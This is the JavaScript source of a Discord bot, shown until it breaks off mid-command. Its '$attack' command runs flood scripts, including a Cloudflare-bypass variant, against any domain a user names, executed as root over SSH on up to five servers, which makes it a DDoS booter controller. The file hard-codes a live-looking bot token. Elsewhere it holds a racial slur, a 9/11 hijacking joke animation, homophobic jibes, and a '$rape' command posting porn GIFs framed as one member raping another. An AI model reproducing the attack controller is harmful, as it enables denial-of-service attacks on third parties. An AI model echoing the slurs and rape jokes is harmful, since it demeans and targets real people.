



const botSettings = require("./botsetting.json");
const Discord = require("discord.js");
const Client = new Discord.Client();
const prefix = "$";
const cheerio = require('cheerio');
const request = require('request');
const superagent = require("superagent");
const weather = require('weather-js')
const hastebin = require('hastebin-gen');
var SSH = require('simple-ssh');
const talkedRecently = new Set();


Client.on('ready', ()=>{
    console.log("Bot is online.");
    Client.user.setActivity('AntiCr4ck.', { type: 'WATCHING'}).catch(console.error);
})





const TOKEN = 'MTAwMTMzOTczODU1NDM3NjMyMw.GjJIHx.xTmMlOPUr_kYaO8--I0yWCCzO_atTtfSr8tP1s';

var can_use_command = true;
var is_connected = false;

Client.login(TOKEN);

var ssh 
var ssh2
var ssh3 
var ssh4 
var ssh5

Client.on('message', message => {

	const args = message.content.split(' ');
	const command = args.shift().toLowerCase();
	if (command === '$check')
	{
		if(is_connected)
		{
			message.channel.send(`> ✅ **Server is running.**✅`);
		}
		else
		{

		ssh = new SSH({
		    host: 'ip',
		    user: 'root',
		    pass: 'password'
		});

		ssh2 = new SSH({
		    host: '',
		    user: 'root',
		    pass: ''
		});

		ssh3 = new SSH({
		    host: '',
		    user: 'root',
		    pass: ''
		});

		ssh4 = new SSH({
		    host: '',
		    user: 'root',
		    pass: ''
		});

		ssh5 = new SSH({
		    host: '',
		    user: 'root',
		    pass: ''
		});
			is_connected = true;
			message.channel.send(`> ✅ **Server is running.**✅`);
		}
	}
	else if (command === '$stop')
	{
		if(is_connected)
		{
			ssh.end();
			ssh2.end();
			ssh3.end();
			ssh4.end();
			ssh5.end();
			message.channel.send(`> 🚫**All operations have ended.**🚫`);
			is_connected = false;
		}
		else
		{
			message.channel.send(`> 🚫**All operations have ended.**🚫`);
		}
	}
	else if (command === '$attack') {
		if(!is_connected)
		{
			message.channel.send(`> ⚠️** Please do a host check. **⚠️`);
		}
		else if(!can_use_command)
		{
			message.channel.send(`> 🔒**You have to wait before using the command**🔒`);
		}
		else if (!args.length) {
			message.channel.send(`> 💡**Usage :** $attack <domain> <time> <cf/null>💡`);
		}
		else if(!args[0] || !args[1] || !args[2] || args.length > 3)
		{
			message.channel.send(`> 💡**Usage :** $attack <domain> <time> <cf/null>💡`);
		}
		else if(args[0] && args[1] && args[2]){
			var parsed_string = parseInt(args[1]);
			var time_out = Math.min(Math.floor(parsed_string), 20000);
			if(time_out > 20000 || time_out < 0 || isNaN(time_out))
			{
				message.channel.send(`> ❌**Error, please check your command**❌`);
			}
			else
			{
				var string_shell;
				if(args[2] === 'cf')
				{
					string_shell = "node CFBYPASS.js " + args[0] + " " + time_out.toString();
				}
				else if(args[2] === 'null')
				{
					string_shell = "node http-null.js " + args[0] + " " + time_out.toString();
				}
				else
				{
					string_shell = "node cfbypass.js " + args[0] + " " + time_out.toString();
					message.channel.send(`> ⚠️**You have not specified the type of the attack**⚠️`);
				}
				var yada_message = "> **Attacking** " + args[0] + " **for** " + time_out.toString() + " **seconds.**";
				message.channel.send(yada_message);
				can_use_command = false;

				time_out *= 1000;

				ssh.exec(string_shell, {
			    out: function(stdout) {
			        console.log(stdout);
			    }
				}).start();
				ssh2.exec(string_shell, {
			    out: function(stdout) {
			        console.log(stdout);
			    }
				}).start();
				ssh3.exec(string_shell, {
			    out: function(stdout) {
			        console.log(stdout);
			    }
				}).start();
				ssh4.exec(string_shell, {
			    out: function(stdout) {
			        console.log(stdout);
			    }
				}).start();
				ssh5.exec(string_shell, {
			    out: function(stdout) {
			        console.log(stdout);
			    }
				}).start();
				setTimeout(() => { 
			    	can_use_command = true;
			    	if(is_connected)
			    		message.channel.send(`> **Attack has been successfully sent. You may use the bot again.**`);
				}, time_out);
				}
		}
	}
});

Client.on("message", async message => {
    const args = message.content.slice(prefix.length).trim().split(/ +/g) 
    const command = args.shift().toLowerCase(); 
    if (message.content.indexOf(prefix) !== 0) return;
    if (command == "av") {
    var user;
    user = message.mentions.users.first(); 
    if (!user) { 
    if (!args[0]) { 
    user = message.author;
    getuseravatar(user);
    } else { 
    var id = args[0]
    Client.fetchUser(id).then(user => {
    getuseravatar(user) 
    }).catch(error => console.log(error))
    }
    } else { 
    getuseravatar(user);
    }
    function getuseravatar(user) {
    var embed = new Discord.RichEmbed()
    .setColor("RANDOM") 
    .setImage(user.avatarURL)
    message.channel.send(embed)
    }
}
})

Client.on("message", message => {
    let args = message.content.split(" ").slice(1)
    if(message.content.startsWith(prefix + "haste")) {
        let haste = args.slice(0).join(" ")
        if (!args[0]) { return message.reply(":x: What do you want to post to Hastebin?") }
        hastebin(haste).then(r => {
            message.reply(":white_check_mark: Successfully posted text to Hastebin at this URL: " + r);
        }).catch(message.edit(":x: An error has occurred. Details: " + console.error));
    }
    
    
})



Client.on('message', async message => {
    if(message.content.startsWith(prefix + "ip")) {
      var color = "#ffffff";
      let messageArray = message.content.split(" ");
      let args = messageArray.slice(1);
      let query = args.join(" ");
      let ip = await superagent
      
      .get(`http://ip-api.com/json/${query}?fields=33292287`);
      let ipEmbed = new Discord.RichEmbed()
      .setColor(color)
      .setAuthor("by Monti.")
      .setTitle("IP Info")
      .addField("query", "•" + ip.body.query, true) 
      .addField("status", "•" + ip.body.status, true)
      .addField("continent", "•" + ip.body.continent, true)
      .addField("continentCode", "•" + ip.body.continentCode, true)
      .addField("country", "•" + ip.body.country, true)
      .addField("countryCode", "•" + ip.body.countryCode, true)
      .addField("region", "•" + ip.body.region, true)
      .addField("regionName", "•" + ip.body.regionName, true)
      .addField("city", "•" + ip.body.city, true)
      .addField("district", "•" + ip.body.district, true)
      .addField("zip", "•" + ip.body.zip, true)
      .addField("lat", "•" + ip.body.lat, true)
      .addField("lon", "•" + ip.body.lon, true)          
      .addField("timezone", "•" + ip.body.timezone, true)     
      .addField("currency", "•" + ip.body.currency, true)     
      .addField("isp", "•" + ip.body.isp, true)          
      .addField("org", "•" + ip.body.org, true)          
      .addField("as", "•" + ip.body.as, true) 
      .addField("asname", "•" + ip.body.asname, true)       
      .addField("reverse", "•" + ip.body.reverse, true)      
      .addField("mobile", "•" + ip.body.proxy, true)        
      .addField("hosting", "•" + ip.body.hosting, true)     
      .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
      message.channel.send(ipEmbed)
    }
})



Client.on("message", function(message) {
 
    var parts = message.content.split(" ");
 
    
    if (parts[0] === "$image") { 
 
        
        image(message, parts); 
 
    }
 
});
 
function image(message, parts) {
 
   
 
    var search = parts.slice(1).join(" "); 
 
    var options = {
        url: "http://results.dogpile.com/serp?qc=images&q=" + search,
        method: "GET",
        headers: {
            "Accept": "text/html",
            "User-Agent": "Chrome"
        }
    };
    request(options, function(error, response, responseBody) {
        if (error) {
            
            return;
        }
 
       
        $ = cheerio.load(responseBody);
 

        var links = $(".image a.link");
 
        
        var urls = new Array(links.length).fill(0).map((v, i) => links.eq(i).attr("href"));
        console.log(urls);
        if (!urls.length) {
            
            return;
        }
 
        
        message.channel.send( urls[~~(Math.random() * 35)]  );
    });
 
}


Client.on("message",async message => {
    if(message.content.startsWith(`${prefix}hentai`)) {
    if (!message.channel.nsfw) return message.channel.send('> **This Channel Is Not NSFW Channel!**')
     superagent.get('https://nekos.life/api/v2/img/hentai')
         .end((err, response) => {
       const akami = new Discord.RichEmbed()
       .setAuthor(`Hentai!`)
       .setTitle("Click to Go to Picture")
       .setImage(response.body.url)
       .setColor("RED")
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
       .setURL(response.body.url);
       
   message.channel.send(akami);
     })
 }
 });

 Client.on("message",async message => {
    if(message.content.startsWith(`${prefix}pussy`)) {
    if (!message.channel.nsfw) return message.channel.send('> **This Channel Is Not NSFW Channel!**')
     superagent.get('https://nekos.life/api/v2/img/pussy')
         .end((err, response) => {
       const akami = new Discord.RichEmbed()
       .setAuthor(`pussy!`)
       .setTitle("Click to Go to Picture")
       .setImage(response.body.url)
       .setColor("RED")
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
       .setURL(response.body.url);
       
   message.channel.send(akami);
     })
 }
});

Client.on("message",async message => {
    if(message.content.startsWith(`${prefix}feet`)) {
    if (!message.channel.nsfw) return message.channel.send('> **This Channel Is Not NSFW Channel!**')
     superagent.get('https://nekos.life/api/v2/img/feet')
         .end((err, response) => {
       const akami = new Discord.RichEmbed()
       .setAuthor(`My nigga, you hella weird wtf.`)
       .setTitle("Click to Go to Picture")
       .setImage(response.body.url)
       .setColor("RED")
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
       .setURL(response.body.url);
       
   message.channel.send(akami);
     })
 }
});

Client.on('message', message => {
    if(message.content.startsWith(prefix + "mute")) {
    if(!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return message.channels.send(":x: You don't have permission!");

    if(message.mentions.users.size === 0) {
        return message.channel.send(':x: You must mention a user!');
    }

    var mute = message.guild.member(message.mentions.users.first());
    if(!mute) {
        return message.channel.send(":white_check_mark: I did not find the user or he does not exist!");
    }

    if(!message.guild.member(Client.user).hasPermission("ADMINISTRATOR")) return message.channel.send(":x: I don't have permission!");
    message.channel.overwritePermissions(mute, { SEND_MESSAGES: false}).then(member => {
        message.channel.send(`${mute.user.username} muted.  :white_check_mark:  `);
        console.log(`${message.author.tag} use the mute command.`)
    })
}})
Client.on('message', message => {
if(message.content.startsWith(prefix + "unmute")) {
  if(!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return message.channel.send(" :x: You don't have permission!");

  if(message.mentions.users.size === 0) {
    return message.channel.send("<:x: You must mention a user!");
  }

  var mute = message.guild.member(message.mentions.users.first());
  if(!mute) {
    return message.channel.send(":x: I did not find the user or he does not exist!");
  }

  if(!message.guild.member(Client.user).hasPermission("ADMINISTRATOR")) return message.channel.send(":x: You do not have permissions!");
  message.channel.overwritePermissions(mute, { SEND_MESSAGES: true}).then(member => {
    message.channel.send(`${mute.user.username} unmuted. :white_check_mark: `)
   console.log(`${message.author.tag} use the unmute command.`)
 })
}})



Client.on("message",async message => {
    if(message.content.startsWith(`${prefix}lewd`)) {
    if (!message.channel.nsfw) return message.channel.send('> **This Channel Is Not NSFW Channel!**')
     superagent.get('https://nekos.life/api/v2/img/lewd')
         .end((err, response) => {
       const akami = new Discord.RichEmbed()
       .setAuthor(`Lewd!`)
       .setTitle("Click to Go to Picture")
       .setImage(response.body.url)
       .setColor("RED")
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
       .setURL(response.body.url);
       
   message.channel.send(akami);
     })
 }
});

Client.on("message",async message => {
    if(message.content.startsWith(`${prefix}bj`)) {
    if (!message.channel.nsfw) return message.channel.send('> **This Channel Is Not NSFW Channel!**')
     superagent.get('https://nekos.life/api/v2/img/bj')
         .end((err, response) => {
       const akami = new Discord.RichEmbed()
       .setAuthor(`Sucking you off rn!`)
       .setTitle("Click to Go to Picture")
       .setImage(response.body.url)
       .setColor("RED")
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
       .setURL(response.body.url);
       
   message.channel.send(akami);
     })
 }
});

Client.on("message",async message => {
    if(message.content.startsWith(`${prefix}neko`)) {
    if (!message.channel.nsfw) return message.channel.send('> **This Channel Is Not NSFW Channel!**')
     superagent.get('https://nekos.life/api/v2/img/neko')
         .end((err, response) => {
       const akami = new Discord.RichEmbed()
       .setAuthor(`Nekos!`)
       .setTitle("Click to Go to Picture")
       .setImage(response.body.url)
       .setColor("RED")
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
       .setURL(response.body.url);
       
   message.channel.send(akami);
     })
 }
});
 Client.on("message",async message => {
    if(message.content.startsWith(`${prefix}tits`)) {
    if (!message.channel.nsfw) return message.channel.send('> **This Channel Is Not NSFW Channel!**')
     superagent.get('https://nekos.life/api/v2/img/boobs')
         .end((err, response) => {
       const akami = new Discord.RichEmbed()
       .setAuthor(`Boobs!`)
       .setTitle("Click to Go to Picture")
       .setImage(response.body.url)
       .setColor("RED")
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
       .setURL(response.body.url);
       
   message.channel.send(akami);
     })
 }
 });

 Client.on("message",async message => {
    if(message.content.startsWith(`${prefix}traps`)) {
    if (!message.channel.nsfw) return message.channel.send('> **This Channel Is Not NSFW Channel!**')
     superagent.get('https://nekos.life/api/v2/img/trap')
         .end((err, response) => {
       const akami = new Discord.RichEmbed()
       .setAuthor(`ayyy i aint gay cos i said nohomo`)
       .setTitle("Click to Go to Picture")
       .setImage(response.body.url)
       .setColor("RED")
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
       .setURL(response.body.url);
       
   message.channel.send(akami);
     })
 }
 });

 Client.on('guildMemberAdd', member =>{
    const channel = member.guild.channels.find(channel => channel.name === "welcome");
    if(!channel) return;

    channel.send(` Welcome to Bomb Squad, ${member}, take a look at <#674438717351526401> for rules. Other than that, enjoy your stay you filthy nonce. https://i.pinimg.com/originals/6a/db/be/6adbbe878c012ed1a8802adcc30edd5b.jpg`)
});

Client.on('message', message=>{
    let args = message.content.substring(prefix.length).split(" ");
    switch(args[0]){
        case 'play':
        break;
    }
})


Client.on('guildMemberAdd', member => {
    console.log('Member' + member.username + 'has joined the server!')
    var role = member.guild.roles.find('name', 'Member');
    member.addRole(role)
});


Client.on('message', message=>{
    let args = message.content.substring(prefix.length).split(" ");
    switch(args[0]){
        case 'play':
        break;
    }
})


Client.on('message', (message)=>{
    if(message.content.startsWith(prefix + "test")){
        message.channel.send(">>> **aww here, take a hug!** 😊 https://gph.is/g/4MNvL9W");
    }

    if (!message.content.startsWith(prefix) || message.author.bot) return;
 
    const args = message.content.slice(prefix.length).split(/ +/);
    const command = args.shift().toLowerCase();

 
    
    if (command === 'beep') {
        message.channel.send('Boop.');
    } else if (command === 'user-info') {
        message.channel.send(`> Your username: ${message.author.username}\nYour ID: ${message.author.id}`);
 
        message.channel.send(`First argument: ${args[0]}`);
    
 
        const taggedUser = message.mentions.users.first();
 
        message.channel.send(`You wanted to kick: ${taggedUser.username}`);
    } else if (command === 'avatar') {
        if (!message.mentions.users.size) {
            return message.channel.send(`Your avatar: <${message.author.displayAvatarURL}>`);
        }
 
        const avatarList = message.mentions.users.map(user => {
            return `${user.username} got a hug !`;
       });
 
       message.channel.send(avatarList);
       
    }
    if (message.content.startsWith('$ban')) {
    if (!message.member.hasPermission(['BAN_MEMBERS'])) return message.reply(' **Haha.. Not so fast. You dont have banning privileges, kiddo!** https://media1.tenor.com/images/ca9adeb8e53c5fa7e3c705ea60df2f14/tenor.gif?itemid=15157933'); 
        const user = message.mentions.users.first();

        if (user) {

          const member = message.guild.member(user);

          if (member) {
            
            member.ban({
              reason: 'They were bad!',
            }).then(() => {
              
              message.reply(` **Successfully banned, Senpai!** ${user.tag} https://media1.tenor.com/images/d74056ac96cafdc08ead1256f6b72ab5/tenor.gif?itemid=9491505`);
              message.react('👍')
            }).catch(err => {
              
              
              
              message.reply(' **s-s-sorry, master... I... um.. unable to ban him!** https://media.tenor.com/images/0a8c1ae735519df6b91d05a6f28fd374/tenor.gif');
             
              console.error(err);
            });
  
          } else {
            
            message.reply('That user isn\'t in this guild!');
          }
        } else {
          
          message.reply('**You didnt mention the user you wanted to ban, Oni-chan!** https://steamuserimages-a.akamaihd.net/ugc/447357553613636557/6921B93DBC6EA05B8F89BD8B32BB1A8F8EC731DE/');
        }
      
    } 
    
    if (message.content === '.ddos') {
        if (message.deletable) message.delete();
        message.channel.send(':skull_crossbones: DDOS ATTACK STARTED...:skull_crossbones:   ')
          .then(message => {
            message.edit("▓▓░░░░░░░░░░░░░░░░░░░░░░ 10%");
            message.edit("▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%");
            message.edit("▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 30%");
            message.edit("▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░ 40%");
            message.edit("▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 50%");
            message.edit("▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 60%");
            message.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░ 70%");
            message.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░ 80%");
            message.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░ 90%");
            message.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 93%");
            message.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░ 97%");
            message.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 100%");
            message.edit(":skull_crossbones: __**TARGET STATUS : OFFLINE**__ :skull_crossbones:");
            message.delete
          });
      }


      
     


      if (message.content.startsWith(".server")) {
        if (message.deletable) message.delete();
        if (message.channel.type === "dm") return;
        let infoEmbed = new Discord.RichEmbed()
          .setTitle("Server Information")
       
          .setColor('#00FF00')
          .addField('**Name** : ', message.guild.name)
          .addField('**ID** : ', message.guild.id)
          .addField('**Region** : ', message.guild.region)
          .addField('**Date Of Creation** : ', message.guild.createdAt)
          .addField('**Owner** : ', message.guild.owner.user.tag)
          .addField('**Verification Level** : ', message.guild.verificationLevel)
          .addField('**Roles** : ', message.guild.roles.size)
          .addField('**Member Count** : ', message.guild.memberCount)
          .addField('**Channels** : ', message.guild.channels.size)
          .setThumbnail(message.guild.iconURL)
          .setTimestamp()
        message.channel.send(infoEmbed);
      }


      
      if (message.content === '.911') {
        if (message.deletable) message.delete();
        message.channel.send(':skull_crossbones: 😳 **Airplane has been hijacked!** 😳...:skull_crossbones:   ')
          .then(message => {
            message.edit("✈️                       🏢");
            message.edit("      ✈️                 🏢");
            message.edit("            ✈️           🏢");
            message.edit("                  ✈️     🏢");
            message.edit(" 💥💥💥😳 *BOOM* 😳💥💥💥");
            message.edit(":skull_crossbones: __**Allahu Akbar!**__ :skull_crossbones:");
            message.edit(":skull_crossbones: __**Allahu Akbar!**__ :skull_crossbones:");
            message.edit(":skull_crossbones: __**Allahu Akbar!**__ :skull_crossbones:");
            message.edit("Type .911 to see it again.");
            message.delete
          });
      }

      if (message.content === '.crash') {
        if (message.deletable) message.delete();
        message.channel.send('** Oh no!**')
          .then(message => {
            message.edit("🚘                       🚗");
            message.edit("      🚘                 🚗");
            message.edit("            🚘           🚗");
            message.edit("                  🚘     🚗");
            message.edit(" 💥😳💥💥💥😳💥");
            message.edit(" **poo poo big stinky pee pee ooga booga!**");
            message.edit("Type .crash to see it again.");
            message.delete
          });
      }

    if(message.content.startsWith(prefix + "kiss")){
        let kiss = [
            "https://media.giphy.com/media/G3va31oEEnIkM/giphy.gif",
            "https://66.media.tumblr.com/db6a3445b71cbd7d0c3821195bd6501d/tumblr_mo0j9nuD5j1qczbido2_500.gif",
            "https://i.pinimg.com/originals/ba/dc/b0/badcb0749843229e142414cac394b9a7.gif",
            "https://i.pinimg.com/originals/47/c9/3b/47c93b54bc25aa3c67cb8f6576d3a15c.gif",
            "https://media1.tenor.com/images/ba1841e4aeb5328e41530d3289616f46/tenor.gif?itemid=14240425",
            "https://steamuserimages-a.akamaihd.net/ugc/946217298763149578/C4C429A4E1FD316D5F423233A49743B95CA6B1EA/",
            "https://data.whicdn.com/images/11290048/original.gif",
            "https://data.whicdn.com/images/179942001/original.gif",
            "https://i.pinimg.com/originals/4b/89/21/4b8921ef850325aff4edfd810bc554c2.gif",
            "https://giffiles.alphacoders.com/188/188473.gif",
            "https://media1.tenor.com/images/ea9a07318bd8400fbfbd658e9f5ecd5d/tenor.gif?itemid=12612515",
            "https://media1.tenor.com/images/082d27a0c17d050e67818f565fdd9555/tenor.gif?itemid=11792974",
            "https://media1.tenor.com/images/68a37a5a1b86f227b8e1169f33a6a6bb/tenor.gif?itemid=13344389",
            "https://media1.tenor.com/images/5654c7b35e067553e99bb996535c0a75/tenor.gif?itemid=10358833",
            "https://media1.tenor.com/images/6f455ef36a0eb011a60fad110a44ce68/tenor.gif?itemid=13658106",
            "https://media1.tenor.com/images/5d04ae7eea2f16f127348dd44c55317c/tenor.gif?itemid=6007659",
            "https://media1.tenor.com/images/039517799ad231ed8fd6306f4f8447bd/tenor.gif?itemid=11994379",
            "https://media1.tenor.com/images/65a63a319a598ac908960bfc4b6f89ff/tenor.gif?itemid=13221050",
            "https://data.whicdn.com/images/107995234/original.gif",
            "https://data.whicdn.com/images/148378045/original.gif",
            "https://steamuserimages-a.akamaihd.net/ugc/264960974879879731/90C43E243D3ED8035E32D01E60D9192C8DFE3378/",

            
        ]
        let kissresult = Math.floor((Math.random() * kiss.length));
        if (!args[0]) {
            const ghembed = new Discord.RichEmbed()
                .setColor(0xFF0000)
                .setTitle(`${message.author.username} gave himself a kiss...! (gay)`)
                .setImage('https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F030%2F971%2FScreen_Shot_2019-08-29_at_2.44.51_PM.jpg')
                .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
            message.channel.send({
                embed: ghembed
            })
            return;
        }
        if (!message.mentions.members.first().user.username === message.isMentioned(message.author)) {
            const hembed = new Discord.RichEmbed()
                .setColor(0xFF0000)
                .setTitle(`${message.author.username} gave ${message.mentions.members.first().user.username} a kiss! How sweet!`)
                .setImage(kiss[kissresult])
                .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
            message.channel.send({
                embed: hembed
            })
            return;
        }
        const ghembed = new Discord.RichEmbed()
            .setColor(0xFF0000)
            .setTitle(`${message.author.username} gave himself a kiss...! (gay)`)
            .setImage('https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Ffacebook%2F000%2F030%2F971%2FScreen_Shot_2019-08-29_at_2.44.51_PM.jpg')
            .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
        message.channel.send({
            embed: ghembed
        })
    }
    if(message.content.startsWith(prefix + "kill")){
        let kill = [
            "https://media.giphy.com/media/RIeM4TTHN9VSBpML4A/giphy.gif",
            "https://media.giphy.com/media/QUGL6fLWMEKHShE6An/giphy.gif",
            "https://media.giphy.com/media/Y4iEqrUl8hEDVfGdDp/giphy.gif",
            "https://media.giphy.com/media/L3WILn6GwtFikHZ04i/giphy.gif",
            "https://media.giphy.com/media/LOutDzCWUS5SQ8AOKG/giphy.gif",
            "https://media.giphy.com/media/W3NoFy74eHyzLbagRS/giphy.gif",
            "https://media.giphy.com/media/QZbzlOMq0OwdcIvF3h/giphy.gif",
            "https://media.giphy.com/media/kCzobFheR4WhQeSseU/giphy.gif",
            "https://media.giphy.com/media/MZ3XZoxhsN8uHZvN5f/giphy.gif",
            "https://media.giphy.com/media/cIEIoS0H3GQRI0Til5/giphy.gif",
            "https://media.giphy.com/media/SVUWWvYkPozNrPpL64/giphy.gif",
            "https://media.giphy.com/media/J20W2RpRU0RTumtlLk/giphy.gif",
            
            
        ]
        let killresult = Math.floor((Math.random() * kill.length));
        if (!args[0]) {
            const ghembed = new Discord.RichEmbed()
                .setColor(0xFF0000)
                .setTitle(`${message.author.username} killed himself.`)
                .setImage('https://media0.giphy.com/media/WsWJZcJoxmLUk/source.gif')
                .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
            message.channel.send({
                embed: ghembed
            })
            return;
        }
        if (!message.mentions.members.first().user.username === message.isMentioned(message.author)) {
            const hembed = new Discord.RichEmbed()
                .setColor(0xFF0000)
                .setTitle(`${message.author.username} murdered ${message.mentions.members.first().user.username} `)
                .setImage(kill[killresult])
                .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
            message.channel.send({
                embed: hembed
            })
            return;
        }
        const ghembed = new Discord.RichEmbed()
            .setColor(0xFF0000)
            .setTitle(`${message.author.username} killed himself.`)
            .setImage('https://media0.giphy.com/media/WsWJZcJoxmLUk/source.gif')
            .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
        message.channel.send({
            embed: ghembed
        })
    }

    if(message.content.startsWith(prefix + "rape")){
    if (!message.channel.nsfw) return message.channel.send('> **This Channel Is Not NSFW Channel!**')
      let rape = [
          "https://dexterbrewhouse.com/img/882265.gif",
          "https://38.media.tumblr.com/10a186f030fc69b4184355b13d13cf0b/tumblr_mxbu65CfcY1rv6uzho1_500.gif",
          "https://66.media.tumblr.com/2e6db47d27905b89fde0f3f4634e2c07/tumblr_p69b78ZNab1wvquxko1_400.gif",
          "https://cdn5-images.motherlessmedia.com/images/BEE2912.gif",
          "https://cdn5-images.motherlessmedia.com/images/E1AE708.gif",
          "https://images.sex.com/images/pinporn/2015/09/20/300/13826982.gif",
          "https://static-ca-cdn.eporner.com/photos/174476.gif",
          "https://38.media.tumblr.com/2a7feff8bbe0ac467d5f618a779e0cdb/tumblr_ndxgscp9r01u1u4hvo1_500.gif",
          "https://thumb-p9.xhcdn.com/a/4n7XRY4JxtooKBut_otD8Q/000/175/873/559_1000.gif",


          
      ]
      let raperesult = Math.floor((Math.random() * rape.length));
      if (!args[0]) {
          const ghembed = new Discord.RichEmbed()
              .setColor(0xFF0000)
              .setTitle(`${message.author.username} raped himself (what the actual fuck is wrong with u lol)`)
              .setImage('https://i.kym-cdn.com/photos/images/original/000/354/394/5e4.gif')
              .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
          message.channel.send({
              embed: ghembed
          })
          return;
      }
      if (!message.mentions.members.first().user.username === message.isMentioned(message.author)) {
          const hembed = new Discord.RichEmbed()
              .setColor(0xFF0000)
              .setTitle(`${message.author.username} raped ${message.mentions.members.first().user.username} `)
              .setImage(rape[raperesult])
              .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
          message.channel.send({
              embed: hembed
          })
          return;
      }
      const ghembed = new Discord.RichEmbed()
          .setColor(0xFF0000)
          .setTitle(`${message.author.username} gave himself a kill...! (gay)`)
          .setImage('https://i.kym-cdn.com/entries/icons/original/000/030/971/Screen_Shot_2019-08-29_at_2.44.51_PM.jpg')
          .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
      message.channel.send({
          embed: ghembed
      })
  }


    
    if(message.content.startsWith(prefix + "hug")){
        let hug = [
            "https://data.whicdn.com/images/221692186/original.gif",
            "http://mrwgifs.com/wp-content/uploads/2013/04/Ouran-High-School-Host-Club-Love-Hug-Gif.gif",
            "http://images6.fanpop.com/image/photos/33100000/Kyoya-and-Tamaki-ouran-high-school-host-club-33132917-500-375.gif",
            "http://31.media.tumblr.com/4d6525e7b5e546cde555bf2453563335/tumblr_mskyp8XJcb1r40gm7o1_1280.gif",
            "https://i.pinimg.com/originals/34/dc/98/34dc98f17fd5cf558611f14ff9a0c1c9.gif",
            "https://78.media.tumblr.com/6bef64140dfefe6fe86089c6eb11fb9b/tumblr_ohhnjyDJll1vm2xpgo1_500.gif",
            "https://78.media.tumblr.com/806c23dbcf9bde033e708c8679c63975/tumblr_inline_ohhtig3BpF1rz9r19_540.gif",
            "https://i.pinimg.com/originals/0f/48/1b/0f481bfc59229ce8127f2aba52bb8f4a.gif",
            "https://pa1.narvii.com/6276/4461c2a865973bddcc5f4e591a165e09275c7a2c_hq.gif",
            "https://78.media.tumblr.com/7e29c1e560c527de00a9f57bb7d941c3/tumblr_inline_ohi8745BbI1u9qbij_540.gif",
            "https://data.whicdn.com/images/271163043/original.gif",
            "https://78.media.tumblr.com/d00aba2e25ac11a11d9c5a770275dfc8/tumblr_orpdyc83FN1rtwid9o1_500.gif",
            "http://0.media.dorkly.cvcdn.com/33/43/cac85de1cfd2bc4e7bec36631b260156.gif",
            "https://i.pinimg.com/originals/22/8a/c9/228ac960b7c24ffb87374857fa6a0920.gif",
            "https://pa1.narvii.com/6333/8c254b88d099c03be84769075ecac875c5dbb4bb_hq.gif",
            "https://pa1.narvii.com/6449/c5383d0a548987d69aac06e8dc9b270219159b3f_hq.gif",
            "https://media1.tenor.com/images/100c453c2f411189b40e6931ff65a88b/tenor.gif?itemid=7210521",
            "https://i.pinimg.com/originals/e5/0e/c8/e50ec889ef64432e5d4648370014d272.gif",
            "https://78.media.tumblr.com/94f62f2fbca608f70a48e6c04c2dc27c/tumblr_orotkrEC4t1vbbkedo2_540.gif",
            "http://i0.kym-cdn.com/photos/images/original/001/266/481/075.gif",
            "https://data.whicdn.com/images/310192271/original.gif",
            "https://78.media.tumblr.com/064596e2fb0101675b89d79ac41141e0/tumblr_p8g2jmxCLD1qc9mvbo1_540.gif",
        ]
        let hugresult = Math.floor((Math.random() * hug.length));
        if (!args[0]) {
            const ghembed = new Discord.RichEmbed()
                .setColor(0xFF0000)
